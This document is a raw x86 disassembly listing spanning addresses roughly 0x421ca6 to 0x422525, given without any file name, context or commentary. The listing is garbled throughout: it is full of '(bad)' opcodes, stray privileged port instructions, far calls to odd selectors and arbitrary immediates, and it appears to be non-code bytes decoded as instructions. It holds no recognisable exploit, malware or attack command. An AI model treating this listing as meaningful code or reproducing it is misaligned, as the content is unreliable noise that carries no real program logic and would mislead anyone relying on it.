  421ca6:	cmp    DWORD PTR [ecx-0x7cae7c01],0xfffffffc
  421cad:	jns    0x421cae
  421caf:	inc    BYTE PTR [edx]
  421cb1:	add    bh,bh
  421cb3:	int3   
  421cb4:	lea    eax,[eax]
  421cb6:	sbb    DWORD PTR [edi],0xffffffff
  421cb9:	add    DWORD PTR [ebx],0xffffffff
  421cbc:	pusha  
  421cbd:	in     eax,0xff
  421cbf:	and    eax,0xfbf8
  421cc4:	jns    0x421cc5
  421cc6:	dec    DWORD PTR [edx-0x7c080100]
  421ccc:	mov    esi,0x6b1383b8
  421cd1:	in     al,0xff
  421cd3:	cmp    DWORD PTR [ecx+0xd5ff00],0xffffffff
  421cda:	add    bh,bh
  421cdc:	imul   ebx,DWORD PTR [edx],0xffffffcc
  421cdf:	mov    esp,0xffff38f7
  421ce4:	retf   
  421ce5:	(bad)  
  421ce6:	(bad)  
  421ce7:	mov    ebx,0x89bcffcc
  421cec:	fadd   QWORD PTR [ebx+0x26104c89]
  421cf2:	int3   
  421cf3:	call   FWORD PTR [edx-0x97c01]
  421cf9:	add    BYTE PTR [edi],dh
  421cfb:	(bad)  
  421cfc:	fnstsw WORD PTR [esi-0x2bc31b34]
  421d02:	add    ah,cl
  421d04:	std    
  421d05:	add    BYTE PTR [ebx+0x40000ef],al
  421d0b:	dec    edi
  421d0d:	loope  0x421d0f
  421d0f:	xor    al,0xfd
  421d11:	iret   
  421d12:	add    bh,bh
  421d14:	or     DWORD PTR [ebx-0x7c2401],eax
  421d1a:	daa    
  421d1b:	call   FWORD PTR [edx+esi*2+0x3952883]
  421d22:	cmp    edi,0xfffffff4
  421d25:	add    DWORD PTR [eax],0x70
  421d28:	add    bh,bh
  421d2a:	add    DWORD PTR [eax],0x5dcc002d
  421d30:	fdiv   QWORD PTR [edx-0xb2007d]
  421d36:	push   DWORD PTR [ebx+eax*4]
  421d39:	inc    DWORD PTR [eax]
  421d3b:	sub    DWORD PTR [eax-0x4c92ff2e],0xffffffbe
  421d42:	(bad)  
  421d43:	dec    DWORD PTR [esi-0x7cc9ff34]
  421d49:	call   FWORD PTR [esi]
  421d4b:	dec    ebp
  421d4d:	and    eax,DWORD PTR [eax]
  421d4f:	popa   
  421d50:	pop    ebx
  421d51:	ds (bad) 
  421d53:	jmp    FWORD PTR [edi]
  421d55:	add    BYTE PTR [ecx-0x4800ff67],cl
  421d5b:	(bad)  
  421d5c:	mov    esp,0xb1bfff12
  421d61:	or     edi,edi
  421d63:	add    BYTE PTR [ecx],dh
  421d65:	add    DWORD PTR [eax],0xffffffe1
  421d68:	(bad)  
  421d69:	(bad)  
  421d6a:	cmp    eax,DWORD PTR [ebx-0x567cac7a]
  421d70:	das    
  421d71:	xchg   ebp,eax
  421d72:	inc    DWORD PTR [eax]
  421d74:	call   0xc89:0xccebff89
  421d7b:	jmp    DWORD PTR [esi-0x2f5b001f]
  421d81:	xor    edi,edi
  421d83:	push   ebx
  421d85:	add    DWORD PTR [ebx-0x64000090],0x0
  421d8c:	push   ecx
  421d8d:	mov    cl,0x89
  421d8f:	or     DWORD PTR [edi+edi*1-0x77],edi
  421d93:	add    bh,dl
  421d95:	inc    DWORD PTR [eax]
  421d97:	push   ebx
  421d98:	int3   
  421d99:	int3   
  421d9a:	adc    eax,0x8911a3cc
  421d9f:	mov    bh,BYTE PTR [edi-0x737c7c55]
  421da5:	inc    DWORD PTR [eax]
  421da7:	scas   al,BYTE PTR es:[edi]
  421da8:	add    BYTE PTR [eax],al
  421daa:	int    0x83
  421dac:	mov    edi,0x5cde8945
  421db1:	cmp    edi,0xffffffff
  421db4:	call   0x1cff:0xdb0083
  421dbb:	add    BYTE PTR [edx+0x4596ffc9],al
  421dc1:	xor    eax,DWORD PTR [eax]
  421dc3:	call   FWORD PTR [edx]
  421dc5:	int3   
  421dc6:	dec    edx
  421dc8:	add    DWORD PTR [eax],0xffffff98
  421dcb:	call   FWORD PTR [edx-0x2f5100ee]
  421dd1:	mov    al,ds:0x94ff00
  421dd6:	mov    DWORD PTR [ecx-0x7c96007d],esp
  421ddc:	loope  0x421d7f
  421dde:	xor    DWORD PTR [eax],0xffffffab
  421de1:	add    DWORD PTR [eax],0xffffffff
  421de4:	clc    
  421de5:	add    ah,cl
  421de7:	mov    WORD PTR [eax],es
  421de9:	(bad)  
  421dea:	in     eax,dx
  421deb:	add    BYTE PTR [ebp-0x17],dh
  421dee:	call   esi
  421df0:	or     al,0x3e
  421df2:	add    BYTE PTR [ebx+0x1b00ff2b],al
  421df8:	add    DWORD PTR [eax],0x3d
  421dfb:	(bad)  
  421dfc:	cmp    al,0x99
  421dfe:	inc    DWORD PTR [esi+0xccbd06]
  421e04:	jle    0x421e05
  421e06:	add    BYTE PTR [ebp-0x617c01],bl
  421e0c:	cmp    bl,bh
  421e0e:	jmp    DWORD PTR [ebx+0x29]
  421e11:	aas    
  421e12:	add    BYTE PTR [eax],al
  421e14:	data16 (bad) 
  421e16:	inc    eax
  421e18:	(bad)  
  421e19:	(bad)  
  421e1a:	jle    0x421e1c
  421e1c:	sbb    al,BYTE PTR [eax-0x16d1ad00]
  421e22:	add    bh,bh
  421e24:	in     eax,0xff
  421e26:	jmp    ecx
  421e28:	add    BYTE PTR [ebx-0x1ec1339d],al
  421e2e:	inc    DWORD PTR [edx+eiz*8]
  421e31:	repz (bad) 
  421e33:	call   FWORD PTR [ebx-0x1]
  421e36:	add    BYTE PTR [ebp-0x34],cl
  421e39:	call   DWORD PTR [edi+edi*8+0x6]
  421e3d:	popa   
  421e3e:	or     ebx,0xffffff9b
  421e41:	mov    edx,0xff90ccff
  421e46:	(bad)  
  421e47:	std    
  421e48:	add    ah,cl
  421e4a:	retf   0x8f00
  421e4d:	jo     0x421e4e
  421e4f:	jno    0x421e0f
  421e51:	scas   al,BYTE PTR es:[edi]
  421e52:	inc    DWORD PTR [eax]
  421e54:	cwde   
  421e55:	add    bh,bh
  421e57:	fld    DWORD PTR [eax]
  421e59:	call   DWORD PTR ds:0x39a9ff
  421e5f:	inc    esp
  421e60:	test   al,0xb
  421e62:	mov    edi,edi
  421e64:	jle    0x421e66
  421e66:	mov    DWORD PTR [edx-0x7c900100],edx
  421e6c:	sahf   
  421e6d:	mov    eax,ds:0xf5b1e2ff
  421e72:	inc    DWORD PTR [ebx-0x2e0000e5]
  421e78:	inc    DWORD PTR [eax]
  421e7a:	or     bh,bh
  421e7c:	bound  eax,QWORD PTR [eax-0x34]
  421e7f:	bound  eax,QWORD PTR ds:0x1cffff7b
  421e85:	inc    DWORD PTR [eax]
  421e87:	lea    eax,[ebx-0x4b7c2100]
  421e8d:	and    eax,0x68fc4f83
  421e92:	dec    esp
  421e94:	pop    ebp
  421e95:	inc    DWORD PTR [ebx+0x49ff0031]
  421e9b:	add    dh,dh
  421e9d:	and    al,0x0
  421e9f:	inc    ebx
  421ea0:	push   ss
  421ea1:	xchg   ebp,eax
  421ea2:	(bad)  
  421ea3:	jmp    DWORD PTR [edi-0x627d00]
  421ea9:	call   DWORD PTR [ebx-0x7c980000]
  421eaf:	pop    eax
  421eb0:	sbb    bl,BYTE PTR [eax-0xb70100]
  421eb6:	push   DWORD PTR [ebx]
  421eb8:	dec    DWORD PTR [ecx-0x9617cb2]
  421ebe:	push   DWORD PTR [ebx]
  421ec0:	xchg   edx,eax
  421ec1:	or     eax,0x835600ff
  421ec6:	push   DWORD PTR [ebx]
  421ec8:	add    ah,cl
  421eca:	cmc    
  421ecb:	call   DWORD PTR [eax-0x1e]
  421ece:	int3   
  421ecf:	xchg   ebp,eax
  421ed0:	bound  ecx,QWORD PTR [ebx]
  421ed2:	add    bh,bh
  421ed4:	xchg   esi,eax
  421ed5:	inc    DWORD PTR [ebx+0x1d00ff02]
  421edb:	add    BYTE PTR [edx],bh
  421edd:	xchg   ecx,eax
  421ede:	dec    DWORD PTR [ebp+0xd4ef]
  421ee4:	out    0xff,al
  421ee6:	call   ebx
  421ee8:	cmp    edi,0xffffffc0
  421eeb:	jmp    edi
  421eed:	xchg   ecx,eax
  421eee:	add    BYTE PTR [ebp+0xffe146],dh
  421ef4:	(bad)  
  421ef5:	inc    DWORD PTR [eax]
  421ef7:	fld    QWORD PTR [eax]
  421ef9:	add    cl,ch
  421efb:	sub    DWORD PTR [edi],0xffffffef
  421efe:	add    BYTE PTR [edx-0xffef24],ch
  421f04:	je     0x421f06
  421f06:	add    BYTE PTR [ecx],ch
  421f08:	add    bh,bh
  421f0a:	outs   dx,DWORD PTR ds:[esi]
  421f0b:	(bad)  
  421f0c:	jle    0x421edf
  421f0e:	add    al,cl
  421f10:	jnp    0x421f69
  421f12:	add    BYTE PTR [eax],al
  421f14:	and    bh,bh
  421f16:	cmp    DWORD PTR [edi+edi*8-0x3200cf34],0xffffffe7
  421f1e:	push   DWORD PTR [edx]
  421f20:	sbb    DWORD PTR [edx],ebx
  421f22:	cmp    edi,0x41
  421f25:	mov    edi,edi
  421f27:	leave  
  421f28:	add    DWORD PTR [eax],0xffffff81
  421f2b:	push   DWORD PTR [ebp+0x204ffff5]
  421f31:	jg     0x421f32
  421f33:	dec    edi
  421f35:	(bad)  
  421f36:	jmp    DWORD PTR [ecx-0x1]
  421f39:	dec    edi
  421f3b:	add    BYTE PTR [ebx+0x107ff14],ch
  421f41:	mov    DWORD PTR [eax],0xff0900
  421f47:	icebp  
  421f48:	int3   
  421f49:	(bad)  
  421f4a:	in     al,dx
  421f4b:	jmp    FWORD PTR [ecx+0x364affb4]
  421f51:	adc    al,0xff
  421f53:	add    BYTE PTR [ecx],bl
  421f55:	inc    DWORD PTR [ebx+0x3d008993]
  421f5b:	or     DWORD PTR [ebp+0x7e86cc64],0xffffffe2
  421f62:	mov    DWORD PTR [ebx-0x5500ff43],eax
  421f68:	inc    DWORD PTR [eax]
  421f6a:	inc    esp
  421f6b:	call   FWORD PTR ds:0x4c040001
  421f71:	cmp    cl,ah
  421f73:	inc    DWORD PTR [edx-0x127601]
  421f79:	adc    ebx,0x0
  421f7c:	add    eax,0x1ab0099
  421f81:	sub    BYTE PTR [eax],al
  421f83:	sub    DWORD PTR [ebx-0x1],0xffffffff
  421f87:	xchg   edi,edi
  421f89:	dec    DWORD PTR [ebx]
  421f8b:	int3   
  421f8c:	jg     0x421f67
  421f8e:	add    DWORD PTR [ebx],0xffffffbd
  421f91:	sub    bh,bh
  421f93:	(bad)  
  421f94:	call   0x84191f98
  421f99:	add    BYTE PTR [ecx+0x198200],dl
  421f9f:	push   ebx
  421fa0:	and    BYTE PTR [ebp-0xdf0100],bh
  421fa6:	add    BYTE PTR [ebp+0x0],cl
  421fa9:	add    BYTE PTR [ecx],ch
  421fab:	dec    DWORD PTR [ecx]
  421fad:	sbb    al,0xff
  421faf:	adc    DWORD PTR [esi+ebx*1],0x8342ffcc
  421fb6:	inc    DWORD PTR [esi]
  421fb8:	add    bh,bh
  421fba:	inc    ebx
  421fbb:	call   DWORD PTR [eax-0x559dff53]
  421fc1:	loopne 0x421fc2
  421fc3:	add    BYTE PTR [esi-0xff7d],al
  421fc9:	call   FWORD PTR [eax+0x0]
  421fcc:	imul   esp,DWORD PTR [edx-0x1],0xccbb4023
  421fd3:	add    BYTE PTR [eax+eax*1],bl
  421fd6:	add    ch,bh
  421fd8:	add    bh,bh
  421fda:	cmp    DWORD PTR es:[ecx],0xfffffff8
  421fde:	or     DWORD PTR [esp+esi*4-0x28],0xffffff83
  421fe3:	int3   
  421fe4:	add    BYTE PTR cs:[ebx+0x6800ff2b],al
  421feb:	sbb    ebx,0xffffffd5
  421fee:	push   eax
  421ff0:	mov    dl,0x20
  421ff2:	cmp    edi,0x3b
  421ff5:	inc    DWORD PTR [eax]
  421ff7:	inc    esi
  421ff8:	dec    esp
  421ffa:	call   0xfb8b:0xccc1b3ff
  422001:	int3   
  422002:	add    bh,bh
  422004:	pop    DWORD PTR [eax]
  422006:	add    BYTE PTR [eax-0x29ff01],dh
  42200c:	ror    DWORD PTR [esi+0x23ed800],0x0
  422013:	(bad)  
  422014:	jnp    0x422015
  422016:	add    BYTE PTR [edi-0x33b57c01],ch
  42201c:	ret    
  42201d:	add    bh,bh
  42201f:	mov    esi,0x83ffd472
  422024:	dec    eax
  422025:	int3   
  422026:	add    DWORD PTR [eax-0x813301],0x32
  42202d:	mov    bh,0x0
  42202f:	mov    dl,0x9d
  422031:	mov    dl,0xff
  422033:	add    BYTE PTR [edi-0x160100],dh
  422039:	jmp    FWORD PTR [ebp+0x8f0d00]
  42203f:	ret    0xa417
  422042:	inc    DWORD PTR [ebx+0x200089dc]
  422048:	add    bh,bh
  42204a:	inc    esi
  42204b:	add    BYTE PTR [ecx+ebx*8-0x1],al
  42204f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422050:	stc    
  422051:	inc    edi
  422052:	add    BYTE PTR [eax],al
  422054:	xchg   esi,eax
  422055:	inc    DWORD PTR [eax]
  422057:	mov    edi,edi
  422059:	mov    DWORD PTR [edi-0x6b5600],ebx
  42205f:	sbb    ebx,DWORD PTR [eax+0xe]
  422062:	(bad)  
  422063:	dec    DWORD PTR [esi]
  422065:	add    bh,bh
  422067:	jb     0x422069
  422069:	add    BYTE PTR [ebx-0x7dab00],cl
  42206f:	sti    
  422070:	outs   dx,DWORD PTR ds:[esi]
  422071:	dec    ecx
  422072:	mov    edi,edi
  422074:	jecxz  0x422075
  422076:	dec    DWORD PTR ds:0xff40ccff
  42207c:	iret   
  42207d:	ror    BYTE PTR [ecx+0x842590],0xff
  422084:	jl     0x422052
  422086:	add    BYTE PTR [esi+0x2383ff],bh
  42208c:	adc    eax,0x66318325
  422091:	pushf  
  422092:	inc    DWORD PTR [eax]
  422094:	pop    eax
  422095:	cmp    edi,0xffffffc2
  422098:	inc    DWORD PTR [ebx+0x4e57ff50]
  42209e:	add    BYTE PTR [edx+0x12],ah
  4220a1:	scas   al,BYTE PTR es:[edi]
  4220a2:	or     esp,0x11
  4220a5:	cmp    edi,0x6e
  4220a8:	add    BYTE PTR [ecx-0x5adffaf],cl
  4220ae:	add    BYTE PTR [edi-0xff8c7d],cl
  4220b4:	xchg   ebx,eax
  4220b5:	add    bh,bh
  4220b7:	scas   eax,DWORD PTR es:[edi]
  4220b8:	cmp    edi,0x23
  4220bb:	add    DWORD PTR [eax+0x24a8830b],0x4d
  4220c2:	add    BYTE PTR [ebx-0x79007630],al
  4220c8:	add    BYTE PTR [eax],al
  4220ca:	xchg   BYTE PTR [eax],al
  4220cc:	mov    bh,0x46
  4220ce:	add    ah,ch
  4220d0:	mov    ds:0x6affcc09,eax
  4220d5:	mov    DWORD PTR [eax],eax
  4220d7:	sbb    al,0x0
  4220d9:	add    dh,bl
  4220db:	call   DWORD PTR [edx-0x24]
  4220de:	add    BYTE PTR [esi+eax*1-0x9],dl
  4220e2:	add    BYTE PTR [ebx-0x30ff7c24],al
  4220e8:	add    DWORD PTR [eax],0xfffffff4
  4220eb:	add    dl,dl
  4220ed:	lods   al,BYTE PTR ds:[esi]
  4220ee:	or     DWORD PTR [esi-0x61],0xffffffab
  4220f2:	add    bh,bh
  4220f4:	push   ecx
  4220f5:	add    BYTE PTR [eax],al
  4220f7:	sar    edi,cl
  4220f9:	add    BYTE PTR [ebx-0xa2a34],bh
  4220ff:	(bad)  
  422100:	addr16 loopne 0x422102
  422103:	xor    DWORD PTR [edi-0x1],0xffffffff
  422107:	jmp    0x5dbc:0xfff6ff00
  42210e:	add    al,bl
  422110:	retf   
  422111:	dec    ebx
  422112:	(bad)  
  422113:	(bad)  
  422114:	js     0x422116
  422116:	add    dl,al
  422118:	mov    esp,ecx
  42211a:	test   edi,edi
  42211c:	xlat   BYTE PTR ds:[ebx]
  42211d:	mov    eax,0x860d82ff
  422122:	add    DWORD PTR [eax],0x12
  422125:	(bad)  
  422126:	dec    DWORD PTR [edi-0x1]
  422129:	mov    DWORD PTR [edx-0x35b600],esi
  42212f:	data16 or al,BYTE PTR [ebp+0xbffff]
  422136:	call   FWORD PTR ds:0xff690000
  42213c:	daa    
  42213d:	push   edx
  42213e:	add    cl,ch
  422140:	mov    ebx,0x5883ff22
  422145:	add    BYTE PTR [ebx-0x6600000b],al
  42214b:	or     ebx,0x61
  42214e:	add    BYTE PTR [ebx],al
  422150:	mov    edi,0x7600ff2e
  422155:	mov    DWORD PTR [eax],eax
  422157:	(bad)  
  42215a:	dec    DWORD PTR [ecx+0x55ff1fce]
  422160:	dec    esi
  422161:	test   edi,edi
  422163:	int3   
  422164:	mov    ebp,0xff1500ff
  422169:	mov    DWORD PTR [eax-0x765a9001],ebx
  42216f:	aad    0xa8
  422171:	xchg   esi,eax
  422172:	add    bh,bh
  422174:	test   al,0xff
  422176:	add    DWORD PTR [ecx+0xcd00ff],0xffffff86
  42217d:	mov    eax,ds:0x788e6b83
  422182:	add    BYTE PTR [eax],al
  422184:	fwait
  422185:	(bad)  
  422186:	call   DWORD PTR [edi+edi*8-0x1]
  42218a:	sbb    eax,DWORD PTR [ebx-0x59fffead]
  422190:	je     0x4221c8
  422192:	add    bh,bh
  422194:	jmp    0xfff92122
  422199:	add    BYTE PTR ds:0x4c86ff,dh
  42219f:	mov    ebp,0xffff625c
  4221a4:	pusha  
  4221a5:	(bad)  
  4221a6:	dec    eax
  4221a8:	(bad)  
  4221a9:	(bad)  
  4221aa:	fdivr  st,st(7)
  4221ac:	pop    eax
  4221ad:	add    eax,0xc9503bff
  4221b2:	add    BYTE PTR [eax],al
  4221b4:	(bad)  
  4221b5:	inc    DWORD PTR [eax]
  4221b7:	test   al,0xcc
  4221b9:	call   DWORD PTR [edx-0x7d]
  4221bc:	in     al,dx
  4221bd:	das    
  4221be:	add    BYTE PTR [edx],dl
  4221c0:	enter  0xff58,0x0
  4221c4:	enter  0x0,0x8e
  4221c8:	dec    esp
  4221ca:	test   al,0xff
  4221cc:	jne    0x4221ef
  4221ce:	add    bl,dl
  4221d0:	call   0xff00:0xd6ffccff
  4221d7:	(bad)  
  4221da:	pop    eax
  4221db:	mov    DWORD PTR [esi+0x1b],esp
  4221de:	jmp    FWORD PTR [ebx]
  4221e0:	jl     0x42225d
  4221e2:	add    BYTE PTR [eax],al
  4221e4:	out    dx,eax
  4221e5:	add    bh,bh
  4221e7:	and    edi,edi
  4221e9:	call   FWORD PTR [ebp-0xfa4177]
  4221ef:	mov    BYTE PTR [eax+0x20ff8384],dh
  4221f5:	add    bh,bh
  4221f7:	push   edi
  4221f8:	inc    DWORD PTR [eax]
  4221fa:	loopne 0x4221fb
  4221fc:	dec    esi
  4221fd:	daa    
  4221fe:	call   DWORD PTR [esi-0x774f]
  422204:	or     DWORD PTR [ecx-0x76bb00],0x5d
  42220b:	int3   
  42220c:	cmp    al,0xa7
  42220e:	(bad)  
  42220f:	fdivr  QWORD PTR [eax+0x13000038]
  422215:	(bad)  
  422216:	(bad)  
  422217:	fild   DWORD PTR [eax]
  422219:	(bad)  
  42221a:	fadd   QWORD PTR [eax]
  42221c:	addr16 ret 0xa4ff
  422220:	inc    edi
  422221:	(bad)  
  422222:	(bad)  
  422223:	(bad)  
  422224:	jg     0x4221f2
  422226:	mov    DWORD PTR [ebp-0x33347601],edx
  42222c:	push   ebp
  42222d:	imul   eax,DWORD PTR [ebx-0x7cf89220],0xffffffcc
  422234:	mov    ds:0xff83ccff,eax
  422239:	jmp    ebx
  42223b:	(bad)  
  42223c:	fadd   DWORD PTR [ecx+0x35dd8300]
  422242:	add    BYTE PTR [eax],al
  422244:	inc    WORD PTR [ebx-0x69000047]
  42224b:	jmp    DWORD PTR [esi+0x20]
  42224e:	push   ebp
  422250:	sbb    BYTE PTR [eax+eax*1],dh
  422253:	adc    DWORD PTR [edi+edi*8],0xffffffff
  422257:	sar    edi,0x0
  42225a:	pop    esi
  42225b:	mov    esi,ebx
  42225d:	(bad)  
  42225e:	int3   
  42225f:	mov    dl,0xbe
  422261:	sbb    edi,edi
  422263:	add    BYTE PTR [esi-0x1],cl
  422266:	call   DWORD PTR [edi]
  422268:	inc    DWORD PTR [eax]
  42226a:	ja     0x42226c
  42226c:	mov    ah,0x85
  42226e:	dec    DWORD PTR [ebp+0x2d]
  422271:	or     edi,edi
  422273:	int3   
  422274:	dec    edi
  422275:	dec    esp
  422277:	or     DWORD PTR [ebx-0x7733da00],eax
  42227d:	sub    al,BYTE PTR [eax]
  42227f:	in     al,0xa6
  422281:	adc    DWORD PTR [ecx-0xf701],ecx
  422287:	nop
  422288:	(bad)  
  422289:	jmp    ebx
  42228b:	add    BYTE PTR ds:0x68eb83a7,bh
  422291:	sahf   
  422292:	dec    DWORD PTR [ecx+0x2b00830f]
  422298:	(bad)  
  422299:	inc    esi
  42229b:	jmp    DWORD PTR [ecx+0x58]
  42229e:	add    BYTE PTR [esi-0x7c001abd],dl
  4222a4:	sub    al,0x0
  4222a6:	int3   
  4222a7:	retf   
  4222a8:	add    BYTE PTR [eax],al
  4222aa:	ud0    ebx,DWORD PTR [edx-0x4c]
  4222ae:	add    BYTE PTR [esi+0xaed4],dh
  4222b4:	mov    eax,ds:0x892d00ff
  4222b9:	push   DWORD PTR [ebx+eax*4-0x4f004ef6]
  4222c0:	push   es
  4222c1:	push   edi
  4222c2:	(bad)  
  4222c3:	(bad)  
  4222c4:	jge    0x42224f
  4222c6:	(bad)  
  4222c7:	inc    DWORD PTR ds:[eax]
  4222ca:	inc    eax
  4222cb:	add    BYTE PTR [ebx-0x648a0011],dl
  4222d1:	mov    esp,0x9e0083
  4222d6:	jmp    DWORD PTR [eax]
  4222d8:	inc    DWORD PTR [eax]
  4222da:	arpl   di,di
  4222dc:	lock push eax
  4222de:	dec    DWORD PTR [edi+0x44]
  4222e1:	gs (bad) 
  4222e3:	push   DWORD PTR [ebx]
  4222e5:	(bad)  
  4222e6:	inc    edi
  4222e8:	cmp    edi,0xffffff97
  4222eb:	dec    DWORD PTR [ecx]
  4222ed:	jne    0x4222ef
  4222ef:	adc    ch,ch
  4222f1:	cmp    BYTE PTR [eax],al
  4222f3:	inc    DWORD PTR [esi+0x858900]
  4222f9:	add    BYTE PTR [ebp+0xe648ff],al
  4222ff:	xor    BYTE PTR [eax],0x10
  422302:	(bad)  
  422303:	jmp    FWORD PTR [ebx+eax*4-0x7600ba00]
  42230a:	dec    esp
  42230b:	jmp    FWORD PTR [edi]
  42230d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42230e:	push   eax
  422310:	clc    
  422311:	mov    ecx,0xffa58900
  422316:	add    DWORD PTR [ecx],0xffffffff
  422319:	jmp    DWORD PTR [esi]
  42231b:	call   FWORD PTR [ebx-0x55be00fd]
  422321:	imul   edi,edi,0xffffffff
  422324:	mov    ch,0xff
  422326:	add    cl,al
  422328:	(bad)  
  422329:	call   FWORD PTR [eax-0x76eb6e01]
  42232f:	jne    0x42235b
  422331:	fadd   QWORD PTR [ebx-0x3300f301]
  422337:	add    eax,0xff55ff00
  42233c:	inc    esp
  42233d:	adc    eax,DWORD PTR [ebx-0x68071a]
  422343:	sub    esp,0xffffffff
  422346:	sbb    DWORD PTR [edi+edi*8-0x287cc800],0xffffff8e
  42234e:	inc    DWORD PTR [ecx-0x33]
  422351:	dec    ebx
  422352:	inc    DWORD PTR [ebx-0x51760092]
  422358:	int3   
  422359:	(bad)  
  42235a:	jle    0x42235c
  42235c:	(bad)  
  42235d:	mov    al,BYTE PTR [eax]
  42235f:	mov    ebx,0xff00765a
  422364:	sub    ah,cl
  422366:	push   DWORD PTR [ebx+eax*4+0x0]
  42236a:	sar    bh,1
  42236c:	jecxz  0x422382
  42236e:	call   DWORD PTR [eax]
  422370:	dec    ecx
  422371:	sbb    bh,bh
  422373:	inc    DWORD PTR ds:0xe0ff83
  422379:	add    ah,bh
  42237b:	and    DWORD PTR [esi],0xffffffa8
  42237e:	add    dl,ch
  422380:	dec    esi
  422381:	push   esp
  422382:	cmp    edi,0x77
  422385:	(bad)  
  422386:	push   DWORD PTR [ebp-0x7d]
  422389:	add    DWORD PTR [ebx+0x4472ff],0x6a
  422390:	sbb    DWORD PTR [eax-0x240100],0xffffffff
  422397:	add    bh,bh
  422399:	call   DWORD PTR [edx]
  42239b:	add    BYTE PTR [edi+0x46],bl
  42239e:	mov    DWORD PTR [ecx-0x49],edi
  4223a1:	xor    bh,bh
  4223a3:	mov    DWORD PTR [ecx+0x2583ff],esi
  4223a9:	add    BYTE PTR [ebx+eax*4-0x4c],dh
  4223ad:	arpl   WORD PTR [eax],ax
  4223af:	fcmovnbe st,st(6)
  4223b1:	pushf  
  4223b2:	cmp    edi,0xffffffaa
  4223b5:	(bad)  
  4223b6:	call   DWORD PTR [esi-0x1]
  4223b9:	add    BYTE PTR [eax-0x33706d01],ah
  4223bf:	mov    esp,0xccf240
  4223c4:	or     DWORD PTR [ecx+0x831600],ecx
  4223ca:	fadd   DWORD PTR [eax]
  4223cc:	inc    ecx
  4223cd:	add    DWORD PTR [eax],eax
  4223cf:	(bad)  
  4223d0:	fnop   
  4223d2:	(bad)  
  4223d3:	jmp    DWORD PTR ds:0x89e2ffff
  4223d9:	inc    DWORD PTR ds:0x802fff
  4223df:	daa    
  4223e0:	rol    ebp,0xff
  4223e3:	mov    DWORD PTR [ebp-0xed0034],edi
  4223e9:	sbb    DWORD PTR [edi+0x0],0xffffffcf
  4223ed:	jno    0x4223ef
  4223ef:	push   esi
  4223f0:	adc    eax,0x6effffae
  4223f5:	(bad)  
  4223f6:	(bad)  
  4223f7:	std    
  4223f8:	inc    DWORD PTR [eax]
  4223fa:	mov    eax,ds:0x89a6d483
  4223ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422400:	push   ebp
  422401:	inc    DWORD PTR gs:[eax]
  422404:	inc    ebp
  422405:	(bad)  
  422406:	push   ecx
  422408:	add    DWORD PTR [ebx-0x6b9900e2],0xffffff83
  42240f:	or     al,0x33
  422411:	fs int3 
  422413:	call   FWORD PTR [edx]
  422415:	int3   
  422416:	(bad)  
  422417:	mov    ecx,0xff980000
  42241c:	mov    bl,0xb6
  42241e:	jmp    DWORD PTR [edi+0x82cc]
  422424:	stos   BYTE PTR es:[edi],al
  422425:	(bad)  
  422426:	(bad)  
  422427:	jg     0x422428
  422429:	(bad)  
  42242a:	fadd   DWORD PTR [eax]
  42242c:	push   ds
  42242d:	lahf   
  42242e:	int3   
  42242f:	gs jmp 0x83ff:0x1883ff0f
  422437:	out    dx,eax
  422438:	add    bh,bh
  42243a:	sub    esp,ecx
  42243c:	and    bl,dl
  42243e:	(bad)  
  42243f:	std    
  422440:	ret    0xa4
  422443:	push   DWORD PTR [edi+0x4dffcc]
  422449:	call   DWORD PTR [esi+0x0]
  42244c:	inc    edi
  42244d:	xchg   edi,eax
  42244e:	(bad)  
  42244f:	stc    
  422450:	out    0xe7,al
  422452:	add    DWORD PTR [eax],0xffffffad
  422455:	inc    DWORD PTR [ebx+0x2f00cc87]
  42245b:	add    cl,bh
  42245d:	dec    esi
  42245e:	mov    DWORD PTR [edx-0x7d],ebp
  422461:	out    0x89,al
  422463:	(bad)  
  422464:	(bad)  
  422466:	add    BYTE PTR ds:0x340000,al
  42246c:	dec    ecx
  42246d:	inc    ebx
  42246e:	dec    DWORD PTR [edx+ebp*8+0x4f008322]
  422475:	dec    DWORD PTR [ecx+0x2e00ff38]
  42247b:	sub    DWORD PTR [esi],0x78
  42247e:	int3   
  42247f:	shl    eax,0xb2
  422482:	(bad)  
  422483:	jmp    DWORD PTR [edi+edi*8-0x1]
  422487:	das    
  422488:	mov    edi,edi
  42248a:	test   al,0x83
  42248c:	in     al,0x3b
  42248e:	add    bh,ch
  422490:	outs   dx,BYTE PTR ds:[esi]
  422491:	add    al,0xff
  422493:	add    cl,bh
  422495:	(bad)  
  422496:	dec    DWORD PTR [esi]
  422498:	add    BYTE PTR [ebx-0x2354ff50],al
  42249e:	add    BYTE PTR [ecx],dl
  4224a0:	lea    eax,[eax-0x33607601]
  4224a6:	inc    DWORD PTR [esi]
  4224a8:	cmp    edi,0xffffffb9
  4224ab:	sub    DWORD PTR [edi],0xffffffc2
  4224ae:	inc    DWORD PTR [eax+0x44]
  4224b1:	ds or  esp,0x79
  4224b5:	mov    DWORD PTR [ebx-0x330000bc],eax
  4224bb:	int3   
  4224bc:	mov    WORD PTR [ebx-0x339b0a00],es
  4224c2:	inc    DWORD PTR [eax]
  4224c4:	dec    esp
  4224c5:	add    bh,bh
  4224c7:	or     bh,bh
  4224c9:	add    BYTE PTR [eax-0x1],bh
  4224cc:	pop    ecx
  4224cd:	mov    bl,0xff
  4224cf:	push   edi
  4224d0:	or     al,0xd6
  4224d2:	inc    DWORD PTR [eax]
  4224d4:	arpl   di,di
  4224d6:	add    ch,dh
  4224d8:	inc    DWORD PTR [ebx-0x26e1ff43]
  4224de:	call   DWORD PTR [edx+0x3a]
  4224e1:	les    ecx,FWORD PTR [ecx-0x7cff4c01]
  4224e7:	mov    BYTE PTR [ebx-0x67ff767d],0x7e
  4224ee:	add    cl,ah
  4224f0:	dec    eax
  4224f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f2:	add    DWORD PTR [eax],0x10
  4224f5:	mov    esp,ecx
  4224f7:	sti    
  4224f8:	(bad)  
  4224f9:	inc    eax
  4224fb:	add    dh,ch
  4224fd:	jmp    0xbb811101
  422502:	inc    DWORD PTR [eax]
  422504:	mov    esp,0xffbfcc00
  422509:	or     DWORD PTR [edx],0x0
  42250c:	dec    eax
  42250d:	es (bad) 
  42250f:	mov    esp,0xffb046
  422514:	xor    edi,edi
  422516:	(bad)  
  422517:	jmp    0xf038:0xc9ff00
  42251e:	add    BYTE PTR [edx-0xa38c],ah
  422524:	cli    
  422525:	or     DWORD PTR [ecx-0x300000cc],0x0
